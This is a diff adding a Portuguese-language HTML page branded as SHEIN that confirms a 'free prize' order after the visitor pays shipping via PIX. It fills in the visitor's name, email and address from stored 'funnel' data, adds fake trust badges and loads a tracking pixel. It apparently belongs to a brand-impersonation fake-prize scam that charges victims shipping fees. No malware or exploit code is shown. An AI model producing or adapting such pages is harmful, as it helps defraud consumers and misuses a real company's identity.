@@ -1,0 +1,94 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+<meta charset="utf-8">
+<!-- UTMify Pixel -->
+<script>
+  window.pixelId = "679fb0f4bbdfc9f47bf2c735";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+<title>SHEIN | Pedido Confirmado</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&amp;display=swap" rel="stylesheet">
+<script src="https://cdn.tailwindcss.com"></script>
+<link rel="stylesheet" href="css/shein.css">
+<script src="js/shared.js"></script>
+</head>
+<body>
+<div id="app-header"></div>
+<main id="app" style="transition:opacity .15s ease"></main>
+<div id="app-footer"></div>
+<script>
+(function(){
+  mountChrome(100);
+  initHelpWidget();
+
+  var primeiro = (LS.get('funil_nome')||'').split(' ')[0] || 'Participante';
+  var email = LS.get('funil_email') || '';
+  var premio = LS.get('funil_premio') || 'maquiagem';
+  var prizeNames = {maquiagem:'Kit Maquiagem SHEIN',roupas:'Kit Looks Tema Livre',casa:'Kit Utensílios para Casa'};
+  var pName = prizeNames[premio] || 'Kit SHEIN';
+  var freteTipo = LS.get('funil_frete_tipo') || 'full';
+  var fretes = {full:{label:'Econômico',prazo:'3 a 5 dias úteis'},express:{label:'Super Express',prazo:'até 24 horas'}};
+  var f = fretes[freteTipo] || fretes.full;
+
+  var cepFmt = (LS.get('funil_cep')||'').replace(/^(\d{5})(\d{3})$/,'$1-$2');
+  var endereco = [
+    LS.get('funil_rua'),
+    LS.get('funil_complemento'),
+    LS.get('funil_bairro'),
+    (LS.get('funil_cidade')||'') + (LS.get('funil_estado')?'/'+LS.get('funil_estado'):''),
+    cepFmt ? 'CEP '+cepFmt : ''
+  ].filter(Boolean).join(', ');
+
+  function row(label,val){
+    return '<div class="flex justify-between gap-3 py-2.5 border-b border-gray-100 last:border-0">'
+      +'<span class="text-sm text-gray-400 flex-shrink-0">'+label+'</span>'
+      +'<span class="text-sm font-semibold text-gray-800 text-right">'+(escHtml(val)||'—')+'</span></div>';
+  }
+
+  var app = document.getElementById('app');
+  app.innerHTML =
+    '<div class="step-enter wrap-md px-4 py-10">'
+      +'<div class="text-center mb-6">'
+        +'<div class="flex justify-center mb-4"><div class="w-20 h-20 rounded-full bg-green-500 flex items-center justify-center text-white text-4xl heartbeat">✓</div></div>'
+        +'<span class="pill" style="background:#dcfce7;color:#15803d">🎉 PEDIDO CONFIRMADO</span>'
+        +'<h1 class="text-2xl font-extrabold mt-3 mb-1">Pagamento confirmado, '+escHtml(primeiro)+'!</h1>'
+        +'<p class="text-gray-500">Recebemos o pagamento do seu frete. Sua premiação já entrou na fila de separação.</p>'
+      +'</div>'
+
+      +'<div class="bg-white border border-gray-100 rounded-2xl p-4 shadow-sm mb-4">'
+        +'<p class="text-xs font-bold uppercase tracking-wide text-gray-400 mb-2">Resumo do pedido</p>'
+        +row('Premiação', pName)
+        +row('Valor da premiação', 'GRÁTIS')
+        +row('Frete', 'Entrega '+f.label+' · '+f.prazo)
+        +row('Status do frete', 'Pago ✅')
+        +(endereco ? row('Entregar em', endereco) : '')
+      +'</div>'
+
+      +'<div class="rounded-2xl px-4 py-4 mb-4" style="background:#f0fdf4;border:1px solid #bbf7d0">'
+        +'<div class="flex gap-3">'
+          +'<span style="font-size:20px">📦</span>'
+          +'<div>'
+            +'<p class="text-sm font-bold" style="color:#15803d">Código de rastreio a caminho</p>'
+            +'<p class="text-xs text-gray-600 mt-0.5">Você vai receber o código de rastreio'+(email?' no e-mail <b>'+escHtml(email)+'</b>':' por e-mail')+' assim que o pacote for postado (em até 24h úteis).</p>'
+          +'</div>'
+        +'</div>'
+      +'</div>'
+
+      +'<div class="rounded-2xl px-4 py-4 mb-6" style="background:#fffbeb;border:1px solid #fde68a">'
+        +'<p class="text-xs text-gray-600 leading-relaxed">💡 <b>Guarde este e-mail.</b> Toda a comunicação sobre a entrega (rastreio, prazo, confirmação de recebimento) chega por lá. Não pedimos senha, código do banco nem pagamento adicional em nenhum momento.</p>'
+      +'</div>'
+
+      +'<div class="flex items-center justify-center gap-4 text-[11px] text-gray-400 flex-wrap">'
+        +'<span>🔒 Pagamento via PIX</span><span>🏛️ Banco Central</span><span>✅ Pedido protegido</span>'
+      +'</div>'
+    +'</div>';
+
+  try { fireConfetti(60); } catch(e) {}
+})();
+</script>
+</body></html>
